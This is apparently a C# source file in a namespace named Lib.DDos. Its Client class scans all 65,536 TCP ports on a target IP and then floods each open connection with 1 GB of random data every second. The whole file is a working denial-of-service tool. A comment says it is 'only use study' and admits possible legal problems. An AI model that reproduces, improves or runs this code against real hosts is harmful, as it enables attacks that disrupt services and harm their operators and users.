using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Lib.DDos
{
    /// <summary>
    /// if you know ip, you can send big data
    /// this is maybe legel problem
    /// only use study
    /// </summary>
    internal class Client
    {
        private List<Stream> _connectedPorts = [];

        /// <summary>
        /// start, search open port
        /// </summary>
        /// <param name="ip">target</param>
        /// <param name="startPort">search start port</param>
        /// <param name="timeout">wait connect time</param>
        public async void StartAsync(string ip, int startPort = 0, int timeout = 500)
        {
            AutoSend(1024 * 1024 * 1024); //send 1GB per 1second every port is connected

            //while (true) if no search repeat
            {
                for (int port = startPort; port <= ushort.MaxValue; port++) //0 ~ 65535
                {
                    try
                    {
                        TcpClient client = new();
                        await client.ConnectAsync(ip, port).WaitAsync(TimeSpan.FromMilliseconds(timeout));
                        _connectedPorts.Add(client.GetStream());
                        Console.WriteLine("add: " + port);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message + " " + port);
                    }
                }
            }
        }

        private async void AutoSend(int perBytes)
        {
            Random random = new();

            while (true)
            {
                foreach (Stream stream in _connectedPorts)
                {
                    var buffer = new byte[perBytes];
                    random.NextBytes(buffer);
                    await stream.WriteAsync(buffer);
                }

                await Task.Delay(1000);
            }
        }
    }
}
